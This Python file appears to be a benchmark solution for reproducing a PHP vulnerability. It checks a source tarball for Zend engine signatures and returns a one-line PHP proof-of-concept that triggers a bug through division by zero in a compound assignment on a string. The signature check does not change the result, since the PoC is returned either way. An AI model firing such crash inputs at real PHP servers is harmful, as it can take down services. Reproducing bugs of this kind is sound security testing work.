import os
import tarfile
from typing import Optional


class Solution:
    def _tar_contains_signature(self, tar_path: str, signatures: list[bytes], max_files: int = 4000, max_bytes: int = 256 * 1024) -> bool:
        try:
            with tarfile.open(tar_path, "r:*") as tf:
                n = 0
                for m in tf:
                    if n >= max_files:
                        break
                    n += 1
                    if not m.isfile():
                        continue
                    name = m.name.lower()
                    if any(s in name.encode("utf-8", "ignore") for s in (b"zend", b"php", b"ext/", b"sapi/")):
                        f = tf.extractfile(m)
                        if f is None:
                            continue
                        data = f.read(max_bytes)
                        for sig in signatures:
                            if sig in data:
                                return True
        except Exception:
            return False
        return False

    def solve(self, src_path: str) -> bytes:
        php_poc = b'<?php$a=str_repeat("A",2);try{$a/=0;}catch(Error$e){}'

        # Heuristic confirmation (non-fatal): return PHP PoC regardless if detection fails.
        sigs = [
            b"ZEND_ASSIGN_DIV",
            b"ASSIGN_DIV",
            b"DivisionByZeroError",
            b"zend_execute",
            b"zend_vm_execute",
            b"zend_div_function",
        ]

        try:
            if os.path.isfile(src_path) and tarfile.is_tarfile(src_path):
                if self._tar_contains_signature(src_path, sigs):
                    return php_poc
        except Exception:
            pass

        return php_poc